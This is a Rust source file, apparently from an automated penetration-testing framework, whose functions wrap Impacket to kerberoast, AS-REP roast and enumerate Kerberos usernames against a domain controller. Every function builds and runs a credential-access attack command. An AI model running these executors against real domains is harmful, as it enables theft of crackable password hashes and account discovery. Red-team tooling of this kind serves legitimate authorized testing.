//! Kerberos credential access tool executors (kerberoast, AS-REP roast,
//! user enumeration).

use anyhow::Result;
use serde_json::Value;

use crate::args::required_str;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Request TGS tickets for SPNs via `impacket-GetUserSPNs`.
pub async fn kerberoast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-GetUserSPNs")
        .arg(&target)
        .flag("-dc-ip", dc_ip)
        .arg("-request")
        .timeout_secs(60)
        .execute()
        .await
}

/// Request AS-REP hashes for accounts without pre-auth via `impacket-GetNPUsers`.
pub async fn asrep_roast(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-GetNPUsers")
        .arg(&target)
        .flag("-dc-ip", dc_ip)
        .arg("-request")
        .timeout_secs(60)
        .execute()
        .await
}

/// Enumerate valid usernames via Kerberos pre-auth without credentials.
pub async fn kerberos_user_enum_noauth(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let users_file = required_str(args, "users_file")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/");

    CommandBuilder::new("impacket-GetNPUsers")
        .arg(&target)
        .flag("-usersfile", users_file)
        .flag("-dc-ip", dc_ip)
        .arg("-no-pass")
        .timeout_secs(180)
        .execute()
        .await
}
